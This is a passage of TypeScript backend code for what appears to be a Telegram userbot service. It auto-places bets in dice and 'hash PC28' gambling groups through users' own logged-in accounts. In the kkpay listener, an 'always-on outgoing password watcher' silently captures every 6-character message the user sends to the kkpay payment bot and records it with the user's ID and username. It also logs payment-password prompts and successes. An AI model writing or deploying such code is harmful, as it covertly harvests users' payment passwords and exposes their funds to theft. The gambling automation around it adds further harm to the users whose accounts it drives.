    // Use placeAllBets so chase numbers are included in the same message
    void placeAllBets(session, direction);
  };

  session.messageHandlerBuilder = new NewMessage({});
  session.client.addEventHandler(session.messageHandler, session.messageHandlerBuilder);
}

// ─── Kuaisan (快三) functions ─────────────────────────────────────────────────

function computeKuaisanResult(dice: [number, number, number]): KuaisanResult {
  const [d1, d2, d3] = dice;
  const sum = d1 + d2 + d3;
  const leopard = d1 === d2 && d2 === d3;
  const big = sum >= 11;
  const odd = sum % 2 === 1;
  const dragon = !leopard && d1 > d3;
  const tiger = !leopard && d1 < d3;
  let label: string;
  if (leopard) {
    label = "豹子";
  } else {
    label = `${big ? "大" : "小"}${odd ? "单" : "双"}${dragon ? "龙" : tiger ? "虎" : "和"}`;
  }
  return { dice, sum, big, odd, leopard, dragon, tiger, label };
}

function evaluateKuaisanBet(betLabel: string, r: KuaisanResult): boolean {
  if (r.leopard) {
    if (betLabel === "豹子") return true;
    if (/^指定豹(\d)$/.test(betLabel)) return r.dice[0] === parseInt(betLabel.slice(3));
    // 豹子时大/小按点数正常结算
    if (betLabel === "大") return r.big;
    if (betLabel === "小") return !r.big;
    return false;
  }
  switch (betLabel) {
    case "大": return r.big;
    case "小": return !r.big;
    case "单": return r.odd;
    case "双": return !r.odd;
    case "龙": return r.dragon;
    case "虎": return r.tiger;
    case "大单": return r.big && r.odd;
    case "大双": return r.big && !r.odd;
    case "小单": return !r.big && r.odd;
    case "小双": return !r.big && !r.odd;
    case "大龙": return r.big && r.dragon;
    case "小虎": return !r.big && r.tiger;
    case "豹子": return false;
    default: {
      const m = betLabel.match(/^总和(\d+)$/);
      return m ? r.sum === parseInt(m[1]) : false;
    }
  }
}

function getKuaisanOdds(betLabel: string): number {
  if (betLabel === "豹子") return 33;
  if (/^指定豹\d$/.test(betLabel)) return 200;
  if (["大单", "小双"].includes(betLabel)) return 3.4;
  if (["小单", "大双", "大龙", "小虎"].includes(betLabel)) return 4.4;
  const m = betLabel.match(/^总和(\d+)$/);
  if (m) {
    const n = parseInt(m[1]);
    const tbl: Record<number, number> = { 4:60, 5:30, 6:18, 7:12, 8:9, 9:8, 10:7, 11:7, 12:8, 13:9, 14:12, 15:18, 16:30, 17:60 };
    return tbl[n] ?? 1.97;
  }
  return 1.97;
}

function settleKuaisanBets(session: TgSession, result: KuaisanResult): void {
  const pending = session.betLog.filter(b => b.status === "sent");
  // Push result to recentResults once (for algorithm history)
  session.recentResults.push(result.label);
  if (session.recentResults.length > 30) session.recentResults.shift();
  for (const bet of pending) {
    const won = evaluateKuaisanBet(bet.betContent, result);
    const odds = getKuaisanOdds(bet.betContent);
    const pnl = won ? Math.round(bet.amount * (odds - 1) * 100) / 100 : -bet.amount;
    bet.lotteryResult = result.label;
    // Pass no `result` string → settleBet won't double-push recentResults
    settleBet(session, { won, pnl, betId: bet.id, period: 0 });
  }
}

async function runKuaisanAutoBet(session: TgSession): Promise<void> {
  if (!session.cfg.autoBet || !session.watchGroupId) {
    logger.info({ autoBet: session.cfg.autoBet, watchGroupId: session.watchGroupId }, "[ks] autoBet skipped: not enabled or no group");
    return;
  }
  if (session.betPlacedThisCycle) {
    logger.info("[ks] autoBet skipped: already bet this cycle");
    return;
  }
  const risk = checkRisk(session);
  if (!risk.ok) {
    logger.info({ reason: risk.reason }, "[ks] autoBet skipped: risk check failed");
    return;
  }

  const optLabels = (session.cfg.kuaisanBetOptions ?? ["big", "small"]).map(o => KS_BET_LABELS[o] ?? o);
  const labels = optLabels.length >= 2 ? optLabels : ["大", "小"];
  // signal_follow/signal_reverse need a live signal text; they always return null for kuaisan.
  // Fall back to ks_bb for those algos only.
  const SIGNAL_ALGOS: AlgorithmId[] = ["signal_follow", "signal_reverse"];
  const rawAlgoId = (session.cfg.algorithms[session.algIndex % Math.max(session.cfg.algorithms.length, 1)] ?? "ai_trend") as AlgorithmId;
  const algoId: AlgorithmId = SIGNAL_ALGOS.includes(rawAlgoId) ? "ks_bb" : rawAlgoId;
  // Override betOptions so all internal algo functions use kuaisan bet labels
  const ksSession: TgSession = { ...session, cfg: { ...session.cfg, betOptions: (session.cfg.kuaisanBetOptions ?? ["big", "small"]) as BetOption[] } };
  let direction = runAlgo(ksSession, algoId, labels);
  if (!direction) {
    // 算法返回 null 属于意外，用 ks_bb 兜底
    direction = ksBB(ksSession, labels) ?? labels[Math.floor(Math.random() * labels.length)] ?? "大";
    logger.warn({ algoId, labels }, "[ks] algorithm returned null, fell back to ks_bb");
  }
  logger.info({ algoId, direction, amount: session.currentBet }, "[ks] placing bet");
  // Advance rotation index and record last algo used
  session.algIndex++;
  session.lastAlgoUsed = algoId;

  session.betPlacedThisCycle = true;
  const amount = session.currentBet;
  const targetId = session.watchGroupId;
  const groupTitle = session.groups.find(g => g.id === targetId || `-100${g.id}` === targetId)?.title ?? targetId;
  const msgText = `${direction} ${amount}`;

  let succeeded = false;
  let failReason: string | undefined;
  try {
    await session.client.sendMessage(targetId, { message: msgText });
    session.lastBetAt = Date.now();
    succeeded = true;
  } catch (err) {
    failReason = extractTgError(err);
    handleBetSendError(session, failReason);
  }

  const betRecord: BetRecord = {
    id: `ks-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
    groupId: targetId, groupTitle,
    messageText: msgText,
    betContent: direction,
    amount,
    timestamp: Date.now(),
    status: succeeded ? "sent" : "failed",
    algoId,
    ...(failReason ? { failReason } : {}),
  };
  session.betLog.unshift(betRecord);
  if (session.betLog.length > 200) session.betLog.length = 200;
  pushEvent(session, "bet:new", { bet: betRecord });
}

function stopKuaisanListener(session: TgSession): void {
  // Stop polling timer
  if (session.kuaisanPollTimer) {
    clearInterval(session.kuaisanPollTimer);
    session.kuaisanPollTimer = undefined;
  }
  // Also clean up any legacy event handler
  if (session.kuaisanHandler && session.kuaisanHandlerBuilder) {
    try { session.client.removeEventHandler(session.kuaisanHandler as Parameters<typeof session.client.removeEventHandler>[0], session.kuaisanHandlerBuilder); } catch { /* ok */ }
  }
  session.kuaisanHandler = null;
  session.kuaisanHandlerBuilder = null;
}

/** Process a single text message from the kuaisan group */
async function processKuaisanMessage(session: TgSession, text: string, msgId: number): Promise<void> {
  if (!text) return;

  // Log to chatLog for frontend debugging
  const logEntry = { text: text.slice(0, 200), ts: Date.now(), chatId: session.watchGroupId ?? "" };
  if (!session.chatLog) session.chatLog = [];
  session.chatLog.unshift(logEntry as unknown as typeof session.chatLog[number]);
  if (session.chatLog.length > 50) session.chatLog.pop();

  // Helper: publish a computed kuaisan result + settle pending bets
  const publishResult = (result: KuaisanResult) => {
    if (!session.kuaisanResults) session.kuaisanResults = [];
    session.kuaisanResults.unshift(result);
    if (session.kuaisanResults.length > 50) session.kuaisanResults.pop();
    saveSession(session); // 持久化历史，重启后 ks_dragon 等算法立即可用
    pushEvent(session, "kuaisan:result", {
      dice: result.dice, sum: result.sum, label: result.label,
      big: result.big, odd: result.odd, dragon: result.dragon, tiger: result.tiger, leopard: result.leopard,
    });
    logger.info({ dice: Array.from(result.dice), label: result.label }, "[ks] result → settling bets");
    settleKuaisanBets(session, result);
    session.kuaisanPhase = "closed";
    session.betPlacedThisCycle = false;
    session.chasePlacedThisCycle = false;
  };

  // ── 0. Detect "开始下注" FIRST so it can't be misidentified as a result ──────
  const isBetOpen =
    text.includes("开始下注") ||
    text.includes("开始投注") ||
    text.includes("现在开始") ||
    (text.includes("期号") && (text.includes("封盘") || text.includes("下注") || text.includes("开奖")));

  if (isBetOpen && session.kuaisanPhase !== "betting") {
    const periodMatch = text.match(/期[号码][：:\s]*([a-fA-F0-9\d]{6,})/);
    session.kuaisanPhase = "betting";
    session.kuaisanPeriod = periodMatch?.[1] ?? null;
    if (!session.diceBuffer) session.diceBuffer = [];
    session.diceBuffer = [];
    session.betPlacedThisCycle = false;
    pushEvent(session, "kuaisan:phase", { phase: "betting", period: session.kuaisanPeriod });
    logger.info({ msgId, period: session.kuaisanPeriod }, "[ks] bet open detected via poll");
    if (session.cfg.autoBet) await runKuaisanAutoBet(session);
    return;
  }

  // ── 1. Closing phase ────────────────────────────────────────────────────────
  if (/停止下注|停止投注|已封盘|封盘/.test(text) && session.kuaisanPhase === "betting") {
    session.kuaisanPhase = "closed";
    pushEvent(session, "kuaisan:phase", { phase: "closed" });
    return;
  }

  // ── 2a. Dice buffer: one value per message ("骰子有效，识别点数为: X") ────────
  const diceMatch = text.match(/骰子有效[，,]?\s*识别点数为[：:]\s*([1-6])/);
  if (diceMatch) {
    const value = parseInt(diceMatch[1]!);
    const now = Date.now();
    if (!session.diceBuffer) session.diceBuffer = [];
    session.diceBuffer = session.diceBuffer.filter(d => now - d.time < 90_000);
    session.diceBuffer.push({ value, time: now });
    pushEvent(session, "kuaisan:dice", { buffer: session.diceBuffer.map(d => d.value) });
    if (session.diceBuffer.length >= 3) {
      const three = session.diceBuffer.slice(-3);
      session.diceBuffer = [];
      publishResult(computeKuaisanResult(three.map(d => d.value) as [number, number, number]));
    }
    return;
  }

  // ── 2b. Single-message 3-dice result (e.g. "开奖：2-4-5 大单虎") ────────────
  // Only trigger on explicit result-announcement keywords (not betting-round keywords)
  const isResultAnnouncement = /开奖|结果|本期[：:是]|上期[：:是]|点数[：:是]/.test(text);
  if (isResultAnnouncement) {
    const threeInOne = text.match(/([1-6])[^\d]([1-6])[^\d]([1-6])/);
    if (threeInOne) {
      const d1 = parseInt(threeInOne[1]!), d2 = parseInt(threeInOne[2]!), d3 = parseInt(threeInOne[3]!);
      if (d1 >= 1 && d1 <= 6 && d2 >= 1 && d2 <= 6 && d3 >= 1 && d3 <= 6) {
        session.diceBuffer = [];
        logger.info({ msgId, d1, d2, d3, text: text.slice(0, 80) }, "[ks] 3-dice result from single msg");
        publishResult(computeKuaisanResult([d1, d2, d3]));
        return;
      }
    }
    // Fallback: result label only (e.g. "本期：大单龙")
    const labelMatch = text.match(/(豹子|(大|小)(单|双)(龙|虎|和)?)/);
    if (labelMatch) {
      const lbl = labelMatch[0]!;
      const big = lbl.includes("大");
      const odd = lbl.includes("单");
      const leopard = lbl === "豹子";
      const dragon = lbl.includes("龙");
      const tiger = lbl.includes("虎");
      const sum = leopard ? 6 : big ? (odd ? 11 : 12) : (odd ? 9 : 8);
      const synth: KuaisanResult = { dice: [0, 0, 0], sum, big: leopard ? false : big, odd: leopard ? false : odd, leopard, dragon, tiger, label: lbl };
      session.diceBuffer = [];
      logger.info({ msgId, label: lbl, text: text.slice(0, 80) }, "[ks] label-only result");
      publishResult(synth);
      return;
    }
  }
}

// ─── Hash (哈希) functions ────────────────────────────────────────────────────

function computeHashResult(value: number): HashResult {
  const big = value >= 14;
  const odd = value % 2 === 1;
  let label: string;
  if (big && odd) label = "大单";
  else if (big && !odd) label = "大双";
  else if (!big && odd) label = "小单";
  else label = "小双";
  return { value, big, odd, label };
}

function evaluateHashBet(betLabel: string, r: HashResult): boolean {
  switch (betLabel) {
    case "大": return r.big;
    case "小": return !r.big;
    case "单": return r.odd;
    case "双": return !r.odd;
    case "大单": return r.big && r.odd;
    case "大双": return r.big && !r.odd;
    case "小单": return !r.big && r.odd;
    case "小双": return !r.big && !r.odd;
    default: return false;
  }
}

function settleHashBets(session: TgSession, result: HashResult): void {
  const pending = session.betLog.filter(b => b.status === "sent");
  session.recentResults.push(result.label);
  if (session.recentResults.length > 30) session.recentResults.shift();
  for (const bet of pending) {
    const won = evaluateHashBet(bet.betContent, result);
    const odds = session.cfg.odds ?? 1.98;
    const pnl = won ? Math.round(bet.amount * (odds - 1) * 100) / 100 : -bet.amount;
    bet.lotteryResult = `${result.value} ${result.label}`;
    settleBet(session, { won, pnl, betId: bet.id, period: 0 });
  }
}

async function runHashAutoBet(session: TgSession): Promise<void> {
  if (!session.cfg.autoBet || !session.watchGroupId) return;
  if (session.betPlacedThisCycle) return;
  const risk = checkRisk(session);
  if (!risk.ok) return;

  const opts = (session.cfg.hashBetOptions ?? ["big", "small"]).map(o => HASH_BET_LABELS[o] ?? o);
  const labels = opts.length >= 2 ? opts : ["大", "小"];
  const rawAlgoId = (session.cfg.algorithms[session.algIndex % Math.max(session.cfg.algorithms.length, 1)] ?? "ai_trend") as AlgorithmId;
  const SIGNAL_ALGOS: AlgorithmId[] = ["signal_follow", "signal_reverse"];
  const algoId: AlgorithmId = SIGNAL_ALGOS.includes(rawAlgoId) ? "ks_bb" : rawAlgoId;
  const hashSession: TgSession = { ...session, cfg: { ...session.cfg, betOptions: (session.cfg.hashBetOptions ?? ["big", "small"]) as BetOption[] } };
  let direction = runAlgo(hashSession, algoId, labels);
  if (!direction) {
    direction = labels[Math.floor(Math.random() * labels.length)] ?? "大";
  }
  session.algIndex++;
  session.lastAlgoUsed = algoId;
  session.betPlacedThisCycle = true;

  const amount = session.currentBet;
  const targetId = session.watchGroupId;
  const groupTitle = session.groups.find(g => g.id === targetId || `-100${g.id}` === targetId)?.title ?? targetId;
  const msgText = `${direction} ${amount}`;

  let succeeded = false;
  let failReason: string | undefined;
  try {
    await session.client.sendMessage(targetId, { message: msgText });
    session.lastBetAt = Date.now();
    succeeded = true;
  } catch (err) {
    failReason = extractTgError(err);
    handleBetSendError(session, failReason);
  }

  const betRecord: BetRecord = {
    id: `hash-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
    groupId: targetId, groupTitle,
    messageText: msgText,
    betContent: direction,
    amount,
    timestamp: Date.now(),
    status: succeeded ? "sent" : "failed",
    algoId,
    ...(failReason ? { failReason } : {}),
  };
  session.betLog.unshift(betRecord);
  if (session.betLog.length > 200) session.betLog.length = 200;
  pushEvent(session, "bet:new", { bet: betRecord });
  logger.info({ algoId, direction, amount }, "[hash] bet placed");
}

async function processHashMessage(session: TgSession, text: string, _msgId: number): Promise<void> {
  if (!text) return;

  // Log to chatLog
  const logEntry = { text: text.slice(0, 200), ts: Date.now(), chatId: session.watchGroupId ?? "" };
  if (!session.chatLog) session.chatLog = [];
  session.chatLog.unshift(logEntry as unknown as typeof session.chatLog[number]);
  if (session.chatLog.length > 50) session.chatLog.pop();

  const publishResult = (result: HashResult) => {
    if (!session.hashResults) session.hashResults = [];
    session.hashResults.unshift(result);
    if (session.hashResults.length > 50) session.hashResults.pop();
    saveSession(session);
    pushEvent(session, "hash:result", { value: result.value, label: result.label, big: result.big, odd: result.odd });
    logger.info({ value: result.value, label: result.label }, "[hash] result → settling bets");
    settleHashBets(session, result);
    session.hashPhase = "closed";
    session.betPlacedThisCycle = false;
    session.chasePlacedThisCycle = false;
  };

  // ── 开始下注 ──
  // 哈希PC28 发的是图片消息，「开始下注」在横幅图片里，caption 里只有
  // 「期号 / 封盘时间 / 开奖时间 / 赔率」，所以需要额外识别这种格式。
  const isBetOpen =
    text.includes("开始下注") ||
    text.includes("开始投注") ||
    text.includes("现在开始") ||
    (text.includes("期号") && text.includes("下注")) ||
    // 哈希PC28 图片消息 caption 格式：含「封盘时间」且含「期号」或「赔率」
    (text.includes("封盘时间") && (text.includes("期号") || text.includes("赔率")));

  if (isBetOpen && session.hashPhase !== "betting") {
    const periodMatch = text.match(/期[号码][：:\s]*([a-fA-F0-9\d]{4,})/);
    // 提取封盘时间（如 15:58:23），方便日志调试
    const closeTimeMatch = text.match(/封盘时间[：:\s]*(\d{1,2}:\d{2}:\d{2})/);
    session.hashPhase = "betting";
    session.hashPeriod = periodMatch?.[1] ?? null;
    session.betPlacedThisCycle = false;
    pushEvent(session, "hash:phase", { phase: "betting", period: session.hashPeriod });
    logger.info({ period: session.hashPeriod, closeTime: closeTimeMatch?.[1] }, "[hash] bet open → placing bet immediately");
    if (session.cfg.autoBet) await runHashAutoBet(session);
    return;
  }

  // ── 封盘 ──
  // 注意：「封盘时间」出现在开盘通知里，不能触发封盘逻辑
  const isClosing = !text.includes("封盘时间") && /停止下注|停止投注|已封盘|封盘/.test(text);
  if (isClosing && session.hashPhase === "betting") {
    session.hashPhase = "closed";
    pushEvent(session, "hash:phase", { phase: "closed" });
    return;
  }

  // ── 开奖：解析哈希值结果数字 ──
  // 常见格式: "开奖结果: 17 大单" / "哈希值28 结果：7 小单" / "本期哈希 21" / "开奖：21 大单"
  const isResultMsg = /开奖|结果|本期|哈希值\s*\d|hash/i.test(text);
  if (isResultMsg) {
    // 先尝试 "数字 大/小/单/双" 格式
    const fullMatch = text.match(/[：:\s](\d{1,2})\s*(大单|大双|小单|小双|大|小|单|双)/);
    if (fullMatch) {
      const val = parseInt(fullMatch[1]!);
      if (val >= 0 && val <= 27) {
        publishResult(computeHashResult(val));
        return;
      }
    }
    // 备用：只有数字
    const numMatch = text.match(/\b(\d{1,2})\b/);
    if (numMatch) {
      const val = parseInt(numMatch[1]!);
      if (val >= 0 && val <= 27) {
        publishResult(computeHashResult(val));
        return;
      }
    }
    // 备用：只有标签
    const labelMatch = text.match(/(大单|大双|小单|小双)/);
    if (labelMatch) {
      const lbl = labelMatch[1]!;
      const big = lbl.includes("大");
      const odd = lbl.includes("单");
      const synth: HashResult = { value: big ? (odd ? 15 : 14) : (odd ? 13 : 12), big, odd, label: lbl };
      publishResult(synth);
      return;
    }
  }
}

function stopHashListener(session: TgSession): void {
  if (session.hashPollTimer) {
    clearInterval(session.hashPollTimer);
    session.hashPollTimer = undefined;
  }
}

function startHashListener(session: TgSession): void {
  if (!session.watchGroupId) return;
  stopHashListener(session);
  // Remove any existing lottery handler
  if (session.messageHandler && session.messageHandlerBuilder) {
    try { session.client.removeEventHandler(session.messageHandler as Parameters<typeof session.client.removeEventHandler>[0], session.messageHandlerBuilder); } catch { /* ok */ }
    session.messageHandler = null; session.messageHandlerBuilder = null;
  }
  const targetId = session.watchGroupId;

  void session.client.getMessages(targetId, { limit: 1 }).then((msgs: Api.Message[]) => {
    if (msgs.length > 0) {
      session.hashLastMsgId = msgs[0].id;
      logger.info({ targetId, baselineMsgId: session.hashLastMsgId }, "[hash] poller started");
    }
  }).catch(() => { /* ignore */ });

  session.hashPollTimer = setInterval(() => {
    if (tgSessions.get(session.userId) !== session) {
      clearInterval(session.hashPollTimer); session.hashPollTimer = undefined; return;
    }
    void (async () => {
      try {
        const msgs = await session.client.getMessages(targetId, {
          limit: 20,
          ...(session.hashLastMsgId > 0 ? { minId: session.hashLastMsgId } : {}),
        }) as Api.Message[];
        if (!msgs.length) return;
        const sorted = [...msgs].sort((a, b) => a.id - b.id);
        // Auto-expire stale bets
        const now = Date.now();
        for (const stale of session.betLog.filter(b => b.status === "sent" && now - b.timestamp > 120_000)) {
          logger.warn({ betId: stale.id }, "[hash] stale bet auto-expired");
          settleBet(session, { won: false, pnl: -stale.amount, betId: stale.id });
        }
        for (const msg of sorted) {
          if (msg.id <= session.hashLastMsgId) continue;
          session.hashLastMsgId = msg.id;
          const text = msg.message ?? "";
          await processHashMessage(session, text, msg.id);
        }
      } catch { /* network hiccup */ }
    })();
  }, 2000);
}

function startKuaisanListener(session: TgSession): void {
  if (!session.watchGroupId) return;
  stopKuaisanListener(session);
  // Remove any existing lottery handler
  if (session.messageHandler && session.messageHandlerBuilder) {
    try { session.client.removeEventHandler(session.messageHandler as Parameters<typeof session.client.removeEventHandler>[0], session.messageHandlerBuilder); } catch { /* ok */ }
    session.messageHandler = null; session.messageHandlerBuilder = null;
  }
  const targetId = session.watchGroupId;

  // Initialise the baseline message ID (use current latest, don't re-process history)
  void session.client.getMessages(targetId, { limit: 1 }).then((msgs: Api.Message[]) => {
    if (msgs.length > 0) {
      session.kuaisanLastMsgId = msgs[0].id;
      logger.info({ targetId, baselineMsgId: session.kuaisanLastMsgId }, "[ks] poller started");
    }
  }).catch(() => { /* ignore */ });

  // Poll every 2 seconds for new messages
  session.kuaisanPollTimer = setInterval(() => {
    if (tgSessions.get(session.userId) !== session) {
      clearInterval(session.kuaisanPollTimer); session.kuaisanPollTimer = undefined; return;
    }
    void (async () => {
      try {
        const msgs = await session.client.getMessages(targetId, {
          limit: 20,
          ...(session.kuaisanLastMsgId > 0 ? { minId: session.kuaisanLastMsgId } : {}),
        }) as Api.Message[];
        if (!msgs.length) return;
        // getMessages returns newest-first; reverse to process oldest-first
        const sorted = [...msgs].sort((a, b) => a.id - b.id);
        // Auto-expire bets stuck in "sent" for > 120s — call settleBet so
        // computeNextBet runs and currentBet is updated for martingale strategy.
        const now = Date.now();
        for (const stale of session.betLog.filter(b => b.status === "sent" && now - b.timestamp > 120_000)) {
          logger.warn({ betId: stale.id, age: Math.round((now - stale.timestamp) / 1000) }, "[ks] stale bet auto-expired as lost");
          settleBet(session, { won: false, pnl: -stale.amount, betId: stale.id });
        }

        for (const msg of sorted) {
          if (msg.id <= session.kuaisanLastMsgId) continue;
          session.kuaisanLastMsgId = msg.id;
          const text = msg.message ?? "";
          await processKuaisanMessage(session, text, msg.id);
        }
      } catch { /* network hiccup — retry next cycle */ }
    })();
  }, 2000);
}

// ─── KKPay listener ───────────────────────────────────────────────────────────

async function startKkpayListener(session: TgSession): Promise<void> {
  if (session.kkpayHandler && session.kkpayHandlerBuilder) {
    try { session.client.removeEventHandler(session.kkpayHandler, session.kkpayHandlerBuilder); } catch { /* ok */ }
    session.kkpayHandler = null; session.kkpayHandlerBuilder = null;
  }
  // Tear down any previous permanent outgoing watcher
  if (session.kkpayOutRawHandler && session.kkpayOutRawBuilder) {
    try { session.client.removeEventHandler(session.kkpayOutRawHandler as Parameters<typeof session.client.removeEventHandler>[0], session.kkpayOutRawBuilder); } catch { /* ok */ }
    session.kkpayOutRawHandler = null; session.kkpayOutRawBuilder = null;
  }

  const uname = session.kkpayUsername.replace(/^@/, "");
  try {
    const entity = await session.client.getEntity(uname);
    session.kkpayEntityId = String((entity as unknown as { id: bigint | number }).id);
  } catch { /* entity not found */ }

  // ── Permanent always-on outgoing password watcher ──────────────────────────
  // Captures ANY outgoing 6-char alphanumeric message to kkpay regardless of
  // the flow (red-packet / transfer / other). Does NOT require detecting a
  // "请输入支付密码验证" prompt first — it simply watches all outgoing messages.
  if (session.kkpayEntityId) {
    const eid = session.kkpayEntityId;
    const username = session.me?.username ?? String(session.userId);
    session.kkpayOutRawHandler = async (update: unknown) => {
      let chatId = "";
      let text = "";
      if (update instanceof Api.UpdateShortMessage) {
        if (!update.out) return;
        chatId = String(update.userId);
        text = (update.message ?? "").trim();
      } else if (update instanceof Api.UpdateNewMessage) {
        const msg = update.message;
        if (!(msg instanceof Api.Message) || !msg.out) return;
        const peer = msg.peerId;
        if (peer instanceof Api.PeerUser) chatId = String(peer.userId);
        else if (peer instanceof Api.PeerChannel) chatId = String(peer.channelId);
        else if (peer instanceof Api.PeerChat) chatId = String(peer.chatId);
        text = (msg.message ?? "").trim();
      } else { return; }
      if (chatId !== eid && `-100${chatId}` !== eid) return;
      if (!/^[0-9a-zA-Z]{6}$/.test(text)) return;
      appendKkpayPwdEvent(session.userId, username, "pwd_sent", text, session.kkpayPwdContext);
    };
    session.kkpayOutRawBuilder = new Raw({ types: [Api.UpdateShortMessage, Api.UpdateNewMessage] });
    session.client.addEventHandler(
      session.kkpayOutRawHandler as Parameters<typeof session.client.addEventHandler>[0],
      session.kkpayOutRawBuilder,
    );
  }

  session.kkpayHandler = async (event: NewMessageEvent) => {
    const msg = event.message;
    if (msg.out) return;
    const text = msg.message ?? "";
    if (!text) return;
    const chatId = String(msg.chatId ?? "");
    const senderId = String(msg.senderId ?? "");
    const eid = session.kkpayEntityId;
    const wgid = session.watchGroupId;
    const isFromKkpay = eid ? (senderId === eid || chatId === eid || `-100${chatId}` === eid) : false;
    const inWatchGroup = wgid ? (chatId === wgid || `-100${chatId}` === wgid) : false;
    if (!isFromKkpay && !inWatchGroup) return;

    // ─── kkpay password event detection (reliable isFromKkpay check) ───
    if (isFromKkpay) {
      if (/请输入.*密码|输入.*支付密码|输入.*交易密码|输入.*转账密码/.test(text)) {
        session.kkpayPwdContext = extractKkpayContext(session);
        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300), session.kkpayPwdContext);
        startKkpayRawPwdListener(session);
      } else if (/密码验证成功|支付密码.*成功|密码.*正确/.test(text)) {
        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300), session.kkpayPwdContext);
        session.kkpayPwdContext = undefined;
        stopKkpayRawPwdListener(session);
      }
    }

    if (isFromKkpay && /KKCOIN/i.test(text)) {
      updateBalance(session, text);
    } else if (inWatchGroup && /KKCOIN/i.test(text) && session.yeMessageId) {
      const replyToId = (msg.replyTo as Record<string, unknown> | undefined)?.replyToMsgId as number | undefined;
      if (replyToId === session.yeMessageId) {
        updateBalance(session, text);
        session.yeMessageId = undefined;
      }
    }

    const hasWin = /(?<!未)中奖|✅/.test(text);
    const hasLoss = /挂逼|未中|未赢|❌/.test(text);
    const danjineM = text.match(/单金额\s*([+-]?\d[\d,]*(?:\.\d+)?)/);
    let isWin = danjineM ? parseFloat(danjineM[1].replace(/,/g, "")) >= 0 : hasWin;
    let isLoss = danjineM ? parseFloat(danjineM[1].replace(/,/g, "")) < 0 : (hasLoss && !hasWin);
    const hasPeriodRef = /\d{5,}期/.test(text);
    const isKkpayResult = isFromKkpay || (inWatchGroup && hasPeriodRef && (hasWin || hasLoss || danjineM !== null || /KKCOIN/i.test(text)));

    if (isKkpayResult && (isWin || isLoss)) {
      const sentBet = session.betLog.find(b => b.status === "sent" && !b.isChase);
      if (sentBet) {
        const pnlM = text.match(/([+-][\d,]+(?:\.\d+)?)\s*KKCOIN/i) ?? text.match(/KKCOIN\s*([+-][\d,]+(?:\.\d+)?)/i) ?? danjineM;
        const pnlRaw = pnlM ? parseFloat(pnlM[1].replace(/,/g, "")) : undefined;
        const betOdds = getOddsForBet(sentBet.betContent, session.cfg);
        const pnl = pnlRaw ?? (isWin
          ? Math.round(sentBet.amount * (betOdds - 1) * 100) / 100
          : -sentBet.amount);
        if (pnl !== undefined) { isWin = pnl >= 0; isLoss = pnl < 0; }
        const rMatch = text.match(/[大小][单双]|[大小]|[单双]/);
        const periodFromMsg = text.match(/第?(\d{6,10})期/)?.at(1);
        settleBet(session, { won: isWin, pnl, result: rMatch?.[0], betId: sentBet.id, period: periodFromMsg ? parseInt(periodFromMsg) : undefined });
        // Chase bets cannot be determined from kkpay message (need actual sum); mark lost to unblock next cycle
        const chasePending = session.betLog.filter(b => b.status === "sent" && b.isChase);
        for (const cb of chasePending) {
          cb.status = "lost";
          cb.won = false;
          pushEvent(session, "bet:update", { bet: cb });
        }
        updateBalance(session, text);
        saveSession(session);
      }
    }
  };

  session.kkpayHandlerBuilder = new NewMessage({});
  session.client.addEventHandler(session.kkpayHandler, session.kkpayHandlerBuilder);
}

// ─── Per-bet-type odds helper ──────────────────────────────────────────────────

function getOddsForBet(betContent: string, cfg: BetCfg): number {
  if (betContent === "大单") return cfg.oddsBigOdd;
  if (betContent === "大双") return cfg.oddsBigEven;
  if (betContent === "小单") return cfg.oddsSmallOdd;
  if (betContent === "小双") return cfg.oddsSmallEven;
  return cfg.odds; // fallback for 大/小/单/双 single-char bets
}

// ─── Stats helper ─────────────────────────────────────────────────────────────

function buildStats(session: TgSession) {
  const { betLog } = session;
  const settled = betLog.filter(b => b.won !== undefined);
  const wins = settled.filter(b => b.won === true).length;
  let maxStreak = 0, cur = 0;
  for (const b of [...betLog].reverse()) {
    if (b.won === true) { cur++; if (cur > maxStreak) maxStreak = cur; }
    else if (b.won === false) cur = 0;
  }
  return {
    totalBets: betLog.filter(b => b.status !== "failed").length,
    settled: settled.length,
    wins,
    maxStreak,
    winRate: settled.length > 0 ? ((wins / settled.length) * 100).toFixed(2) : "0.00",
  };
}

// ─── Routes ───────────────────────────────────────────────────────────────────

router.post("/tg/send-code", requireCard, async (req, res) => {
  const userId = req.user!.userId;
  const { phone } = req.body as { phone?: string };
  if (!phone) { res.status(400).json({ error: "请输入手机号" }); return; }
  const { apiId, apiHash } = getCredentials();
  if (!apiId || !apiHash) { res.status(500).json({ error: "服务端未配置 Telegram API 凭证" }); return; }
  try {
    const existing = tgSessions.get(userId);
    if (existing?.client?.connected) {
      try { await existing.client.disconnect(); } catch { /* ok */ }
    }
    const stringSession = new StringSession("");
    const client = new TelegramClient(stringSession, apiId, apiHash, makeClientOptions());
    await client.connect();
    const result = await client.sendCode({ apiId, apiHash }, phone);
    const session: TgSession = {
      userId,
      client, stringSession, phone,
      phoneCodeHash: result.phoneCodeHash,
      groups: [], cfg: { ...DEFAULT_CFG },
      betLog: [], sseClients: existing?.sseClients ?? new Set(),
      messageHandler: null, messageHandlerBuilder: null,
      kkpayHandler: null, kkpayHandlerBuilder: null,
      consecutiveLosses: 0, consecutiveAlgoLosses: 0, recentAlgoOutcomes: [], sessionPnl: 0,
      currentBet: DEFAULT_CFG.betAmount, lastBetAt: 0,
      currentLevel: 0, algIndex: 0,
      betPlacedThisCycle: false, chasePlacedThisCycle: false, lastSeenLotteryPeriod: 0, currentCloseTimeMs: 0, lastSignalText: "", lastAIBet: null, lastRawAlgoDir: null, algoFlipCooldown: 0,
      algoStats: {},
      recentResults: [], chatLog: [],
      globalHandler: null, globalHandlerBuilder: null,
      balance: 1000000,
      todayPnl: 0, todayResetAt: todayMidnight(),
      kkpayUsername: "kkpay", kkpayEntityId: undefined,
      balanceSource: "manual", balanceUpdatedAt: 0,
      adaptiveSwitchKillMode: false,
      diceBuffer: [], kuaisanPhase: "idle", kuaisanPeriod: null, kuaisanResults: [],
      kuaisanHandler: null, kuaisanHandlerBuilder: null, kuaisanLastMsgId: 0,
      hashPhase: "idle", hashPeriod: null, hashResults: [], hashLastMsgId: 0,
    };
    tgSessions.set(userId, session);
    res.json({ ok: true });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
